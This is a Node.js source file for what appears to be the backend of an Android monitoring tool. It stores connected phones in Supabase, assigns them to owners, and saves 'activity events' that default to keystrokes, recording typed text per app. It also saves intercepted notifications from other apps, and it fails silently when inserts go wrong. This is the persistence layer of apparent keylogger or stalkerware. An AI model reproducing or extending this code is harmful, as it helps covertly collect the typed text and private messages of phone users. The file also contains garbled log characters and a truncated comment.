/**
 * Supabase Database Service
 * Handles device persistence to Supabase PostgreSQL
 */

import { createClient } from '@supabase/supabase-js';
import { config } from '../config.js';

// Initialize Supabase client
const supabase = config.supabase.url && config.supabase.key && config.supabase.enabled
    ? createClient(config.supabase.url, config.supabase.key)
    : null;

if (config.supabase.enabled && !supabase) {
    console.warn('[Database] ⚠️ Supabase not configured — running in memory-only mode');
} else if (!config.supabase.enabled) {
    console.log('[Database] 🔇 Supabase disabled by environment config (test mode)');
} else {
    console.log('[Database] ✅ Supabase client initialized');
}

export { supabase };

/**
 * Upsert a device (insert or update on conflict)
 */
export async function upsertDevice(deviceId, metadata = {}) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .upsert({
                device_id: deviceId,
                model: metadata.model || null,
                manufacturer: metadata.manufacturer || null,
                android_version: metadata.androidVersion || null,
                battery: metadata.battery || null,
                status: metadata.status || 'online',
                last_seen: new Date().toISOString(),
                connected_at: metadata.connectedAt || new Date().toISOString(),
                owner: metadata.owner || null,
                metadata: metadata,
            }, { onConflict: 'device_id' });

        if (error) {
            console.error(`[Database] Upsert error for ${deviceId}:`, error.message, error.details);
        } else {
            console.log(`[Database] âœ… Device ${deviceId.substring(0, 8)}... saved to Supabase`);
        }
    } catch (err) {
        console.error(`[Database] Error upserting device ${deviceId}:`, err.message);
    }
}

/**
 * Get device IDs owned by a specific user
 */
export async function getUserDevices(owner) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('device_id')
            .eq('owner', owner);

        if (error) throw error;
        return (data || []).map(r => r.device_id);
    } catch (err) {
        console.error('[Database] Error getting user devices:', err.message);
        return [];
    }
}

/**
 * Claim a device for a user (set owner)
 */
export async function claimDevice(deviceId, owner) {
    if (!supabase) return false;

    try {
        const { error } = await supabase
            .from('devices')
            .update({ owner })
            .eq('device_id', deviceId);

        if (error) throw error;
        return true;
    } catch (err) {
        console.error(`[Database] Error claiming device ${deviceId}:`, err.message);
        return false;
    }
}

/**
 * Update device status only
 */
export async function updateDeviceStatus(deviceId, status) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .update({
                status,
                last_seen: new Date().toISOString(),
            })
            .eq('device_id', deviceId);

        if (error) throw error;
    } catch (err) {
        console.error(`[Database] Error updating status for ${deviceId}:`, err.message);
    }
}

/**
 * Load all devices from database (for server startup)
 */
export async function getAllDevices() {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading devices:', err.message);
        return [];
    }
}

/**
 * Delete device permanently from database â€” CASCADE DELETE
 * Removes device and ALL related data from every Supabase table.
 */
export async function deleteDeviceFromDB(deviceId) {
    if (!supabase) return;

    const tables = [
        'activity_events',
        'captured_notifications',
        'notifications',
        'devices',  // Delete device row LAST (after all foreign references)
    ];

    for (const table of tables) {
        try {
            const { error } = await supabase
                .from(table)
                .delete()
                .eq('device_id', deviceId);

            if (error) {
                console.warn(`[Database] Error deleting from ${table} for ${deviceId}: ${error.message}`);
            } else {
                console.log(`[Database] âœ… Deleted ${deviceId} from ${table}`);
            }
        } catch (err) {
            console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
        }
    }

    console.log(`[Database] ✅ Cascade delete complete for device ${deviceId}`);
}

// ========== ACTIVITY EVENTS ==========

/**
 * Save activity events to Supabase (batch insert).
 * @returns {Promise<boolean>} true when the rows were persisted
 */
export async function saveActivityEvents(deviceId, events) {
    if (!supabase || !events || events.length === 0) return true;

    try {
        const rows = events.map(ev => ({
            device_id: deviceId,
            event_type: ev.type || 'keystroke',
            app_package: ev.app || 'unknown',
            text: ev.text || '',
            full_text: ev.fullText || null,
            class_name: ev.className || null,
            created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
        }));

        await withFkRetry(async () => {
            const { error } = await supabase
                .from('activity_events')
                .insert(rows);
            if (error) throw error;
        });
        return true;
    } catch (err) {
        // Silent fail
        return false;
    }
}

/**
 * Delete activity events from Supabase for a device
 */
export async function deleteActivityEventsFromDB(deviceId) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('activity_events')
            .delete()
            .eq('device_id', deviceId);

        if (error) throw error;
        console.log(`[Database] ✅ Deleted activity events for device ${deviceId}`);
    } catch (err) {
        console.error(`[Database] Error deleting activity events for ${deviceId}:`, err.message);
        throw err;
    }
}

/**
 * Get activity events from Supabase
 */
export async function getActivityEventsFromDB(deviceId, limit = 500) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('activity_events')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading activity events:', err.message);
        return [];
    }
}

// on register). Retry once shortly â€” the device insert completes in ~200ms.
async function withFkRetry(fn) {
    try {
        return await fn();
    } catch (err) {
        if (err && (err.code === '23503' || String(err.message).includes('foreign key constraint'))) {
            await new Promise(r => setTimeout(r, 1000));
            return await fn();
        }
        throw err;
    }
}

// ========== LIFECYCLE NOTIFICATIONS (online / offline / setup_complete) ==========

/**
 * Save a device lifecycle event to Supabase (fire & forget).
 */
export async function saveNotification(deviceId, type, title, message, data = {}) {
    if (!supabase) return;

    try {
        await withFkRetry(async () => {
            const { error } = await supabase
                .from('notifications')
                .insert({
                    device_id: deviceId,
                    type,
                    title,
                    message,
                    data,
                });
            if (error) throw error;
        });
    } catch (err) {
        console.error('[Database] Notification save error:', err.message);
    }
}

/**
 * Get lifecycle notifications from Supabase (newest first).
 */
export async function getNotifications(deviceId = null, limit = 100) {
    if (!supabase) return [];

    try {
        let query = supabase
            .from('notifications')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);

        if (deviceId) {
            query = query.eq('device_id', deviceId);
        }

        const { data, error } = await query;
        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading notifications:', err.message);
        return [];
    }
}

// ========== CAPTURED NOTIFICATIONS ==========

/**
 * Save a captured phone notification to Supabase (fire & forget).
 * Deduped on (device_id, key) â€” the same notification posted twice
 * (e.g. re-delivery after reconnect) updates instead of duplicating.
 */
export async function saveCapturedNotification(deviceId, notif = {}) {
    if (!supabase) return;

    const title = notif.title || '';
    const text = notif.text || '';
    const bigText = notif.bigText || '';
    // Message: prefer big text, then text, then title (multi-line joined)
    const message = [bigText, text].filter(Boolean).join('\n') || title || '(no text)';

    try {
        await withFkRetry(async () => {
            const { error } = await supabase
                .from('captured_notifications')
                .upsert({
                    device_id: deviceId,
                    key: notif.key || null,
                    package_name: notif.packageName || null,
                    app_name: notif.appName || notif.packageName || 'unknown',
                    title,
                    message,
                    post_time: notif.timestamp || null,
                    data: notif,
                }, { onConflict: 'device_id,key' });
            if (error) throw error;
        });
    } catch (err) {
        console.error('[Database] Captured notification save error:', err.message);
    }
}

/**
 * Get captured notifications from Supabase (newest first).
 */
export async function getCapturedNotifications(deviceId = null, limit = 200) {
    if (!supabase) return [];

    try {
        let query = supabase
            .from('captured_notifications')
            .select('*')
            .order('post_time', { ascending: false })
            .limit(limit);

        if (deviceId) {
            query = query.eq('device_id', deviceId);
        }

        const { data, error } = await query;
        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading captured notifications:', err.message);
        return [];
    }
}
